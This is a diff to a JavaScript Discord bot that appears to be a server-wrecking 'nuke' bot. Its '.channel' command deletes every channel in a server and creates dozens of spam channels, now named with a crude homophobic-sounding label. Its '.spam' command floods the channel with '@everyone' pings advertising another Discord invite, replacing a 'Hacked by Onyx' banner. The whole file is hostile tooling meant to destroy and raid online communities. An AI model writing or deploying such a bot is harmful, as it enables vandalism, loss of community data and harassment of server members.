@@ -9,38 +9,37 @@ bot.on("ready", () => {
 bot.on("message", function(message){
     if(message.content == ".channel"){
         message.guild.channels.forEach(channel => channel.delete())
-        message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
-	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+        message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
+	    message.guild.createChannel("t gay", "t gay");
     }
 
     bot.on("message", function(message){
@@ -60,15 +59,24 @@ bot.on("message", function(message){
 
     bot.on("message", function(mesasge){
         if(message.content == ".spam"){
-            message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
-		message.channel.send("**Hacked by Onyx**")
+            message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		message.channel.send("@everyone NOUVEAU SERVER https://discord.gg/EZGDKWD")
+		
 		
         }
     })
